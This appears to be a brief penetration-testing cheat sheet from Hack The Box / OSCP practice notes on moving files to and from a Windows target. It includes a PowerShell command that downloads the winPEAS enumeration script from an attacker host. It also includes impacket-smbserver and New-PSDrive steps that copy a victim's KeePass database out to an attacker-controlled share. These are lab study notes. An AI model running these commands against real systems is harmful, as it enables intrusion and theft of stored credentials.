# Windows File Transfer Commands

---

```
Invoke-WebRequest -Uri "http://<local_ip>/winPEAS.bat" -OutFile "C:\Users\Jareth\Documents\winPEAS.bat"
```

#### SMB Running

When nothing is working, but an smb server is running we can utilize "impacket-smbserver" to create an custom smb server and mount the file/directory we want onto it and access the file and download it locally.

On local machine: 

```
impacket-smbserver private-drive /home/saitama/Desktop/Exploiting/OSCP_Prep/HTB/Windows/Jeeves
```

```
impacket-smbserver <custom_name> <path>
```

On target machine:

```
New-PSDrive -Name "HelloWorld" -PSProvider "FileSystem" -Root "\\10.10.14.239\private-drive"
cd HelloWorld:
cp C:\Users\kohsuke\Documents\CEH.kdbx .
```

The file should now be on our local system.



